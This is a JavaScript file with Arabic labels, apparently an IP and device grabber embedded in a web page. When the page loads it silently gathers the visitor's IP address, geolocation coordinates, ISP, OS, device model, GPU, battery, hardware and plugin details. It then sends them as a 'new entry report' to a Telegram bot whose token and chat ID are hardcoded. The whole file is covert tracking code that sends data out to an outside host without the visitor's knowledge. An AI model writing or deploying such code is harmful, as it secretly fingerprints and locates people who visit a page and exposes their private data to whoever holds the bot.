async function getIPAddress() {
    const providers = [
        'https://api.ipify.org?format=json',
        'https://ipinfo.io/json',
        'https://ipapi.co/json/'
    ];
    
    for (const url of providers) {
        try {
            const response = await fetch(url);
            if (!response.ok) continue;
            
            const data = await response.json();
            return data.ip || data.ipAddress || 'غير معروف';
        } catch (error) {
            console.error(`❌ خطأ في جلب IP من ${url}:`, error);
        }
    }
    return 'غير معروف';
}

async function getLocation(ip) {
    const providers = [
        `https://ipapi.co/${ip}/json/`,
        `https://ipinfo.io/${ip}/json`,
        `https://geolocation-db.com/json/${ip}`
    ];
    
    for (const url of providers) {
        try {
            const response = await fetch(url);
            if (!response.ok) continue;
            
            const data = await response.json();
            return {
                city: data.city || data.region || 'غير معروف',
                country: data.country_name || data.country || 'غير معروف',
                isp: data.org || data.isp || 'غير معروف',
                coordinates: data.loc || 'غير معروف',
                timezone: data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف'
            };
        } catch (error) {
            console.error(`❌ خطأ في مزود الموقع ${url}:`, error);
        }
    }
    return {
        city: 'غير معروف',
        country: 'غير معروف',
        isp: 'غير معروف',
        coordinates: 'غير معروف',
        timezone: 'غير معروف'
    };
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    const result = {
        deviceType: 'غير معروف',
        os: 'غير معروف',
        osVersion: 'غير معروف',
        deviceModel: 'غير معروف',
        browser: 'غير معروف',
        browserVersion: 'غير معروف',
        architecture: 'غير معروف'
    };

    if (/Mobi|Android/i.test(ua)) {
        result.deviceType = 'هاتف محمول';
    } else if (/Tablet|iPad/i.test(ua)) {
        result.deviceType = 'جهاز لوحي';
    } else {
        result.deviceType = 'كمبيوتر';
    }

   if (/Android/i.test(ua)) {
        result.os = 'Android';
        const androidMatch = ua.match(/Android\s([0-9.]+)/);
        if (androidMatch) result.osVersion = androidMatch[1];
        
        const modelMatch = ua.match(/; (\w+)(?:\sbuild|\))/i);
        if (modelMatch) result.deviceModel = modelMatch[1];
    } 
    else if (/iPhone|iPad|iPod/i.test(ua)) {
        result.os = 'iOS';
        const versionMatch = ua.match(/OS\s(\d+_\d+)/);
        if (versionMatch) result.osVersion = versionMatch[1].replace('_', '.');
        result.deviceModel = /iPhone/.test(ua) ? 'iPhone' : 'iPad';
    }
    else if (/Windows/i.test(ua)) {
        result.os = 'Windows';
        const winMatch = ua.match(/Windows NT (\d+\.\d+)/);
        if (winMatch) result.osVersion = winMatch[1];
    }
    else if (/Mac/i.test(ua)) {
        result.os = 'macOS';
    }
    else if (/Linux/i.test(ua)) {
        result.os = 'Linux';
    }

    const browserMatch = ua.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident(?=\/))\/?\s*(\d+)/i) || [];
    if (browserMatch[1]) {
        result.browser = browserMatch[1].replace('Trident', 'IE');
        result.browserVersion = browserMatch[2] || 'غير معروف';
    }

    if (/Win64|x64|WOW64/i.test(ua)) {
        result.architecture = '64-bit';
    } else if (/Win32|WOW32/i.test(ua)) {
        result.architecture = '32-bit';
    }

    return result;
}

async function getExtraInfo() {
    const result = {
        screenResolution: `${screen.width} × ${screen.height}`,
        colorDepth: `${screen.colorDepth} بت`,
        language: navigator.language || 'غير معروف',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف',
        cookiesEnabled: navigator.cookieEnabled ? 'نعم' : 'لا',
        battery: 'غير متوفر',
        connection: {
            type: 'غير معروف',
            speed: 'غير معروف',
            saveData: 'غير معروف'
        },
        hardware: {
            ram: 'غير متوفر',
            cores: 'غير متوفر',
            gpu: 'غير متوفر'
        },
        plugins: []
    };

    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            result.battery = {
                level: `${Math.round(battery.level * 100)}%`,
                charging: battery.charging ? 'يشحن' : 'لا يشحن',
                chargingTime: battery.chargingTime === Infinity ? 'غير معروف' : `${battery.chargingTime} ثانية`
            };
        } catch (e) {
            console.error('⚡ خطأ في جلب معلومات البطارية:', e);
        }
    }

   if ('connection' in navigator) {
        const conn = navigator.connection;
        result.connection = {
            type: conn.effectiveType || 'غير معروف',
            speed: conn.downlink ? `${conn.downlink} Mbps` : 'غير معروف',
            saveData: conn.saveData ? 'نعم' : 'لا',
            rtt: conn.rtt ? `${conn.rtt} مللي ثانية` : 'غير معروف'
        };
    }

    if ('deviceMemory' in navigator) {
        result.hardware.ram = `${navigator.deviceMemory} GB`;
    }
    
    if ('hardwareConcurrency' in navigator) {
        result.hardware.cores = navigator.hardwareConcurrency;
    }

    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                result.hardware.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {
        console.error('🎮 خطأ في كشف بطاقة الرسوميات:', e);
    }

    if (navigator.plugins && navigator.plugins.length > 0) {
        result.plugins = Array.from(navigator.plugins).map(plugin => ({
            name: plugin.name,
            description: plugin.description,
            version: plugin.version
        }));
    }

    return result;
}

async function sendToTelegram(data) {
    const botToken = '7642723730:AAHHWTNISOFjIbmSOIpJhpcolcubTYE0ezw';
    const chatId = '5962064921';
    
    // تنسيق رسالة أكثر تفصيلاً
    const message = `
🍂 <b>تقرير دخول جديد</b>
─────────────────
🖥️ <b>معلومات الشبكة</b>
┤ العنوان: <code>${data.ip || 'غير معروف'}</code>
┤ الموقع: <code>${data.location.city}, ${data.location.country}</code>
┤ الإحداثيات: <code>${data.location.coordinates}</code>
┤ مزود الخدمة: <code>${data.location.isp}</code>
┘ المنطقة الزمنية: <code>${data.location.timezone}</code>

📋 <b>معلومات الجهاز</b>
┤ النوع: <code>${data.device.deviceType}</code>
┤ النظام: <code>${data.device.os} ${data.device.osVersion}</code>
┤ الطراز: <code>${data.device.deviceModel}</code>
┤ المتصفح: <code>${data.device.browser} ${data.device.browserVersion}</code>
┘ البنية: <code>${data.device.architecture}</code>

📦 <b>معلومات إضافية</b>
┤ الشاشة: <code>${data.extra.screenResolution} (${data.extra.colorDepth})</code>
┤ اللغة: <code>${data.extra.language}</code>
┤ الكوكيز: <code>${data.extra.cookiesEnabled}</code>
┤ البطارية: <code>${typeof data.extra.battery === 'object' ? 
    `${data.extra.battery.level} (${data.extra.battery.charging})` : data.extra.battery}</code>
┤ الشبكة: <code>${data.extra.connection.type} (${data.extra.connection.speed})</code>
┘ الأجهزة: <code>RAM: ${data.extra.hardware.ram}, Cores: ${data.extra.hardware.cores}</code>

🕰️ <b>التوقيت</b>
┤ التاريخ: <code>${data.time.date}</code>
┘ الوقت: <code>${data.time.time}</code>
─────────────────
🏷️ <b>رابط الموقع:</b> <a href="${data.url}">${data.url}</a>
    `.trim();

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                disable_notification: false
            })
        });
        
        const responseData = await response.json();
        if (!responseData.ok) {
            console.error('❌ فشل إرسال البيانات:', responseData.description);
            return false;
        }
        
        console.log('✅ تم إرسال البيانات بنجاح إلى Telegram');
        return true;
    } catch (error) {
        console.error('🚨 حدث خطأ أثناء الإرسال:', error);
        return false;
    }
}

document.addEventListener('DOMContentLoaded', async function() {
    const startTime = new Date();
    
    try {
        const [ip, device, extra] = await Promise.all([
            getIPAddress(),
            getDeviceInfo(),
            getExtraInfo()
        ]);
        
        const location = ip && ip !== 'غير معروف' ? await getLocation(ip) : {
            city: 'غير معروف',
            country: 'غير معروف',
            isp: 'غير معروف',
            coordinates: 'غير معروف',
            timezone: 'غير معروف'
        };
        
        const visitData = {
            ip,
            location,
            device,
            extra,
            url: window.location.href,
            time: {
                date: startTime.toLocaleDateString(),
                time: startTime.toLocaleTimeString(),
                timestamp: startTime.getTime()
            },
            userAgent: navigator.userAgent
        };
        
        console.log('📊 بيانات الزيارة المجمعة:', visitData);
    const sendResult = await sendToTelegram(visitData);
        

        if (!sendResult) {
            console.warn(' لم يتم إرسال البيانات بنجاح، سيتم المحاولة لاحقاً');
                }
    } catch (error) {
        console.error(' حدث خطأ غير متوقع:', error);
    }
});
